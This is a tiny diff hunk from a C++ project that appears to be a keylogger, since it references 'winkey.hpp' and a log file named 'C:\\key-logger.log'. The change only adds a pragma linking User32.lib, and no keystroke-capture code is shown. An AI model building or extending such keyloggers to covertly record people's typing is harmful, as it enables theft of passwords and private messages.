@@ -12,6 +12,8 @@
 
 #include "winkey.hpp"
 
+#pragma comment(lib, "User32.lib")
+
 #define FILENAME "C:\\key-logger.log"
 
 class duplicated_stream
